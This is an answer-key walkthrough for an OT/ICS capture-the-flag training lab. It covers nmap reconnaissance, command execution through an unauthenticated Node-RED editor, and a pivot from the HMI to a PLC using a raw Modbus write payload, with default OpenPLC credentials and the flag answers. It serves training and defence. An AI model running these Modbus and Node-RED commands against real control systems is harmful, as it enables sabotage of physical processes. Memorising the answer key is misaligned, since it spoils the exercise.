# OT Sandbox — Training Solution Walkthrough

This document provides the complete step-by-step solutions for all four levels of the **Simple OT Simulation Sandbox** training scenario. All commands are executed from the **Kali attacker-host** GUI console accessed via the Guacamole web interface.

---

## Network Layout

| Host | Network | IP | Services |
|---|---|---|---|
| `attacker-host` | mgmt-net | `10.10.10.50` | Kali Linux (attacker workstation) |
| `scada-hmi` | mgmt-net | `10.10.10.10` | Node-RED on port `1880` |
| `openplc-node` | ot-net | `192.168.99.10` | OpenPLC (Modbus `502`, Admin `8080`) |
| `ot-router` | mgmt-net / ot-net | `10.10.10.1` / `192.168.99.1` | Gateway firewall |

### Firewall Rules (configured on `ot-router`)

| Source | Destination | Port | Action |
|---|---|---|---|
| `10.10.10.50` (attacker) | `192.168.99.10` (PLC) | `502` | **DROP** |
| `10.10.10.50` (attacker) | `192.168.99.10` (PLC) | `8080` | **DROP** |
| `10.10.10.10` (SCADA HMI) | `192.168.99.10` (PLC) | `502` | ALLOW |

> [!IMPORTANT]
> The attacker cannot directly reach the PLC. All Modbus traffic must be pivoted through the compromised SCADA HMI node.

---

## Level 0: Welcome (INFO_LEVEL)

Read the introduction describing the lab environment. No action required — click **Next**.

---

## Level 1: Access the Attacker Host (ACCESS_LEVEL)

1. In the training portal topology graph, click on **`attacker-host`**.
2. Click the **Web Console** link to open the Guacamole remote desktop session.
3. You should see the Kali Linux XFCE desktop.
4. Submit the passkey: **`start`**

---

## Level 2: SCADA Exploitation

**Objective:** Exploit the unauthenticated Node-RED interface on `scada-hmi` to execute arbitrary commands and read `/root/flag.txt`.

**Answer:** `FLAG{SCADA_EXPLOITED_RCE}`

### Step 1 — Reconnaissance

Open a terminal on the Kali desktop and scan the SCADA HMI:

```bash
nmap -sV -p 1880 10.10.10.10
```

Expected output:
```
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
```

Optionally, perform a broader scan to discover all services:

```bash
nmap -sV 10.10.10.10
```

### Step 2 — Access the Node-RED Flow Editor

Open the **Firefox** browser on Kali and navigate to:

```
http://10.10.10.10:1880/
```

This opens the Node-RED visual flow editor. The interface is **unauthenticated** — no login is required. This is the vulnerability being exploited: an exposed flow editor allows arbitrary command execution on the host.

### Step 3 — Build a Command Execution Flow

In the Node-RED editor, construct a flow with three nodes wired together:

1. **Add an Inject node** (trigger):
   - In the left palette, find **`inject`** (under "common")
   - Drag it onto the canvas
   - Double-click it, leave defaults, click **Done**

2. **Add an Exec node** (command execution):
   - In the left palette, find **`exec`** (under "advanced")
   - Drag it onto the canvas
   - Double-click it and configure:
     - **Command:** `cat /root/flag.txt`
     - Leave "Append msg.payload" unchecked
   - Click **Done**

3. **Add a Debug node** (output viewer):
   - In the left palette, find **`debug`** (under "common")
   - Drag it onto the canvas
   - Double-click it, leave defaults, click **Done**

4. **Wire them together:**
   - Draw a wire from the **inject** node output → **exec** node input
   - Draw a wire from the **exec** node's first output (stdout) → **debug** node input

The flow should look like:

```
[inject] ──► [exec: cat /root/flag.txt] ──► [debug]
```

### Step 4 — Deploy and Execute

1. Click the **Deploy** button (top-right, red button)
2. Open the **debug panel** (bug icon on the right sidebar)
3. Click the small blue button on the left side of the **inject** node to trigger it

### Step 5 — Read the Flag

The debug panel on the right will display:

```
FLAG{SCADA_EXPLOITED_RCE}
```

Submit this as the answer for Level 2.

---

## Level 3: OT Sabotage

**Objective:** Pivot through the compromised SCADA HMI to write value `9999` to Modbus Holding Register 0 on the PLC, triggering the simulation monitor daemon to write a sabotage flag.

**Answer:** `FLAG{OT_SABOTAGE_SUCCESS}`

### Step 1 — Verify Network Constraints

From the Kali terminal, confirm that the attacker cannot directly reach the PLC on port 502:

```bash
nmap -p 502 192.168.99.10
```

Expected output:
```
PORT    STATE    SERVICE
502/tcp filtered mbap
```

The port is **filtered** — the router firewall is blocking direct access.

### Step 2 — Send the Modbus Write Command via Node-RED

Since you already have command execution on `scada-hmi` through the Node-RED exec node, use it to run a Python script that sends a raw Modbus TCP write request from the HMI (which is allowed through the firewall).

In the Node-RED editor (`http://10.10.10.10:1880/`):

1. **Create a new tab** or delete the previous flow

2. **Add an Inject node** (same as before)

3. **Add an Exec node** and configure it with the following command:

   ```
   python3 -c "import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x27\x0f'); print('Response:', s.recv(1024).hex()); s.close()"
   ```

4. **Add a Debug node** wired to the exec node's stdout output

5. **Wire them:** `inject → exec → debug`

6. Click **Deploy**, then trigger the **inject** node

The debug panel should show a response confirming the write was accepted:
```
Response: 000100000006010600002710
```

#### Modbus Payload Breakdown

```
\x00\x01   Transaction ID (arbitrary)
\x00\x00   Protocol ID (Modbus TCP)
\x00\x06   Length (6 bytes follow)
\x01       Unit ID (slave address 1)
\x06       Function Code 06 (Write Single Register)
\x00\x00   Register Address 0
\x27\x0f   Value 9999 (0x270F)
```

### Step 3 — Retrieve the Sabotage Flag

The `simulation-monitor` daemon on `openplc-node` polls Holding Register 0 every second. When it detects the value `9999`, it writes the flag to `/root/flag2.txt` and exits.

To retrieve the flag, use an exec node in Node-RED to read it. You have several options:

**Option A — Read via another Modbus query and exec node:**

Create a new exec node with the command:
```
python3 -c "import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\x00\x02\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'); r=s.recv(1024); val=(r[9]<<8)|r[10]; print('Register 0 value:', val); s.close()"
```
This confirms the register was written. The flag itself is on the PLC filesystem.

**Option B — Read the flag file via the OpenPLC web admin interface:**

Navigate to `http://192.168.99.10:8080` from a Node-RED exec node (via curl):
```
curl -s http://192.168.99.10:8080
```
The default OpenPLC credentials are `openplc` / `openplc`. You can explore the admin panel to find ways to read files.

**Option C — Read via SSH (if keys are shared):**
```
ssh -o StrictHostKeyChecking=no 192.168.99.10 'cat /root/flag2.txt'
```

The flag is:

```
FLAG{OT_SABOTAGE_SUCCESS}
```

Submit this as the answer for Level 3.

---

## Summary of Answers

| Level | Type | Answer |
|---|---|---|
| 0 — Welcome | INFO | *(none — just read)* |
| 1 — Access Attacker Host | ACCESS | `start` |
| 2 — SCADA Exploitation | TRAINING | `FLAG{SCADA_EXPLOITED_RCE}` |
| 3 — OT Sabotage | TRAINING | `FLAG{OT_SABOTAGE_SUCCESS}` |

---

## MITRE ATT&CK Mapping

| Level | Technique | ID |
|---|---|---|
| 2 | Exploitation of Remote Services | T0866 |
| 2 | Command and Scripting Interpreter | T0807 |
| 3 | Modify Controller Tasking | T0821 |
| 3 | Manipulation of Control | T0831 |
| 3 | Lateral Movement (Pivoting) | TA0008 |
